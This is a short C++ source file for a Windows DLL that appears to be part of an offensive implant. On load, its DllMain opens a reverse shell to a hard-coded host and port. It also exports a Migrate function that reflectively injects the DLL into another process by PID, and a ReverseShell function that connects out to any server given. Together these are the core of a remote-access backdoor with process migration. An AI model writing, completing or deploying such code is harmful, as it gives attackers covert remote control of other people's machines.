#include <cstdint>

#include "../shell/sopar.h"
#include "../inject/inject.h"
#include "../reflecter/reflect.h"

#include "exports.h"

static struct {
    void *where;
    size_t size;
} DllMeta;

extern "C" BOOL DllMain(void *where, size_t size)
{
    DllMeta.where = where;
    DllMeta.size  = size;
    if(!move_dll) ReverseShell("localhost", "1234");
    return TRUE;
}

extern "C" __declspec(dllexport) void Migrate(uint32_t pid)
{
    _InjectPid(DllMeta.where, DllMeta.size, offset_to_rva(DllMeta.where, &_ReflectiveLoad), pid);
}

extern "C" __declspec(dllexport) void ReverseShell(const char *server, const char *port)
{

    sopar test(server, port);
    test.go();
    
    //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sopar::go, &test, 0, NULL);
}